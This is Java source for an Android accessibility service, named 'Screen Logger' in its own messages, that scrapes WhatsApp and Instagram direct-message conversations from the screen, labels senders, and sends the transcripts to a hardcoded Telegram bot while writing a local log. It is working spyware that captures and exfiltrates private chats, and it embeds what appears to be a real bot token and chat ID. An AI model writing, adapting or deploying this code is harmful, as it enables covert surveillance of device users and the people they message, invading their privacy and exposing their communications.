package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR TELEGRAM CREDENTIALS
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    private long lastSendTime = 0;
    private String lastSentHash = "";

    // Instagram IDs
    private static final String INSTAGRAM_HEADER_ID = "com.instagram.android:id/header_title";
    private static final String INSTAGRAM_COMPOSER_ID = "com.instagram.android:id/row_thread_composer_edittext";

    // WhatsApp container IDs
    private Set<String> whatsappContainerIds = new HashSet<String>() {{
        add("com.whatsapp:id/outgoing_message_container");
        add("com.whatsapp:id/incoming_message_container");
    }};

    // Blacklist
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
        add("Message"); add("Chat"); add("Group"); add("Broadcast");
        add("View Profile"); add("View Story"); add("Reply to");
        add("Manage"); add("Clear all"); add("Location off");
        add("Self Aware"); add("Inspo needed...");
        add("GB"); add("MB"); add("used"); add("airtel"); add("Screenlogger");
        add("Telegram"); add("Search or ask Meta AI");
        add("The Wild Theme"); add("Janam Janam"); add("Sai Abhyankkar");
        add("Dhanush"); add("Pritam"); add("Arijit Singh"); add("Antara Mitra");
        add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
        add("Bakchodi boiz"); add("MARK AS READ");
        add("Display brightness");
        add("Unpopular opinion");
        add("Explore");
        add("Reels");
        add("Gallery"); add("Camera"); add("Files"); add("Messages"); add("Phone");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        if (pkg.equals("com.whatsapp")) {
            processWhatsApp(root);
        } else if (pkg.equals("com.instagram.android")) {
            processInstagram(root);
        }
        // Snapchat – you can add later
    }

    // ---------- WHATSAPP (fully working) ----------
    private void processWhatsApp(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> containers = findContainersByViewId(root, whatsappContainerIds);
        List<MessageEntry> messages = new ArrayList<>();
        for (AccessibilityNodeInfo container : containers) {
            String viewId = container.getViewIdResourceName();
            boolean isOutgoing = viewId != null && viewId.contains("outgoing");
            String msg = extractTextFromNode(container);
            if (msg == null || msg.isEmpty()) continue;
            msg = cleanMessage(msg);
            if (msg.isEmpty()) continue;
            String sender = isOutgoing ? "You" : "Unknown";
            // Try to get contact name (optional)
            messages.add(new MessageEntry(sender, msg));
        }
        if (messages.isEmpty()) return;
        String contact = findTextByExactViewId(root, "com.whatsapp:id/contact_name");
        if (contact == null) contact = findTextByExactViewId(root, "com.whatsapp:id/conversation_contact_name");
        // For incoming messages, replace "Unknown" with the contact name if we have it
        if (contact != null && !contact.isEmpty()) {
            for (MessageEntry m : messages) {
                if (m.sender.equals("Unknown")) {
                    m.sender = contact;
                }
            }
        }
        sendFormattedOutput(messages, "WHATSAPP", contact);
    }

    // ---------- INSTAGRAM (using left/right alignment) ----------
    private void processInstagram(AccessibilityNodeInfo root) {
        // 1. Get contact name
        String contactName = findTextByExactViewId(root, INSTAGRAM_HEADER_ID);
        if (contactName == null || contactName.isEmpty()) {
            // Not a DM – ignore
            return;
        }

        // 2. Collect all text views with their bounds
        List<TextNode> nodes = new ArrayList<>();
        collectTextNodes(root, nodes, 0);

        // 3. Filter out header, composer, junk, timestamps
        List<TextNode> filtered = new ArrayList<>();
        int screenWidth = getResources().getDisplayMetrics().widthPixels;
        for (TextNode node : nodes) {
            String text = node.text;
            String cleaned = cleanMessage(text);
            if (cleaned.isEmpty()) continue;
            if (cleaned.equals(contactName)) continue;
            if (cleaned.equals("Message…")) continue;
            if (cleaned.matches(".*\\d{1,2}:\\d{2}\\s*(AM|PM)?")) continue;
            // Exclude if it's the composer (by ID)
            if (node.viewId != null && node.viewId.equals(INSTAGRAM_COMPOSER_ID)) continue;
            // Also exclude if it's a system text
            filtered.add(node);
        }

        if (filtered.isEmpty()) return;

        // 4. Sort by vertical position (top to bottom)
        filtered.sort((a, b) -> Integer.compare(a.top, b.top));

        // 5. Assign sender based on horizontal position
        List<MessageEntry> messages = new ArrayList<>();
        for (TextNode node : filtered) {
            String sender;
            // Incoming messages are left-aligned (x < screenWidth/2 - some margin)
            // Outgoing are right-aligned (x > screenWidth/2)
            int centerX = screenWidth / 2;
            if (node.left < centerX - 50) {
                sender = contactName; // incoming
            } else if (node.left > centerX + 50) {
                sender = "You"; // outgoing
            } else {
                // Fallback – if it's in the middle, we can't decide; default to "You"
                sender = "You";
            }
            messages.add(new MessageEntry(sender, node.text));
        }

        if (messages.isEmpty()) return;
        sendFormattedOutput(messages, "INSTAGRAM", contactName);
    }

    // ---------- HELPER: collect text nodes with bounds ----------
    private static class TextNode {
        String viewId;
        String text;
        int left, top;
        TextNode(String viewId, String text, int left, int top) {
            this.viewId = viewId;
            this.text = text;
            this.left = left;
            this.top = top;
        }
    }

    private void collectTextNodes(AccessibilityNodeInfo node, List<TextNode> list, int depth) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) {
                Rect rect = new Rect();
                node.getBoundsInScreen(rect);
                list.add(new TextNode(node.getViewIdResourceName(), text, rect.left, rect.top));
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectTextNodes(child, list, depth + 1);
        }
    }

    // ---------- FORMATTED OUTPUT (unified) ----------
    private void sendFormattedOutput(List<MessageEntry> messages, String appName, String contact) {
        if (messages.isEmpty()) return;

        StringBuilder logBuilder = new StringBuilder();
        logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), appName));
        if (contact != null && !contact.isEmpty()) {
            logBuilder.append("👤 Chat with: ").append(contact).append("\n");
        }
        logBuilder.append("─────────────────────\n");
        for (MessageEntry msg : messages) {
            logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
        }

        String fullLog = logBuilder.toString().trim();
        if (fullLog.length() < 30) return;

        String hash = Integer.toHexString(fullLog.hashCode());
        long now = System.currentTimeMillis();
        if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
            return;
        }
        lastSentHash = hash;
        lastSendTime = now;

        sendToTelegram(fullLog);
        writeToFile(fullLog);
    }

    // ---------- WHATSAPP HELPERS ----------
    private List<AccessibilityNodeInfo> findContainersByViewId(AccessibilityNodeInfo root, Set<String> ids) {
        List<AccessibilityNodeInfo> results = new ArrayList<>();
        traverseContainers(root, results, ids);
        return results;
    }

    private void traverseContainers(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, Set<String> ids) {
        if (node == null) return;
        if (node.getViewIdResourceName() != null) {
            for (String id : ids) {
                if (node.getViewIdResourceName().equals(id)) {
                    list.add(node);
                    return;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) traverseContainers(child, list, ids);
        }
    }

    private String extractTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        StringBuilder sb = new StringBuilder();
        collectAllText(node, sb);
        return sb.toString();
    }

    private void collectAllText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectAllText(child, sb);
        }
    }

    // ---------- GENERIC HELPERS ----------
    private String findTextByExactViewId(AccessibilityNodeInfo node, String targetId) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
            if (node.getText() != null) return node.getText().toString().trim();
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = findTextByExactViewId(child, targetId);
                if (result != null) return result;
            }
        }
        return null;
    }

    private String cleanMessage(String msg) {
        msg = msg.trim();
        for (String junk : uiJunk) {
            if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
        }
        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
        if (msg.matches(".*(AM|PM).*")) return "";
        if (msg.matches(".*\\d+[mh] .*")) return "";
        if (!msg.matches(".*[a-zA-Z].*")) return "";
        if (msg.length() < 3) return "";
        if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
        return msg;
    }

    // ---------- TELEGRAM & FILE LOGGING ----------
    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                writeToFile("Telegram error: " + e.toString());
            }
        }).start();
    }

    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) { /* ignore */ }
    }

    @Override
    public void onInterrupt() {}

    // ---------- INNER CLASSES ----------
    private static class MessageEntry {
        String sender;
        String text;
        MessageEntry(String sender, String text) {
            this.sender = sender;
            this.text = text;
        }
    }
}
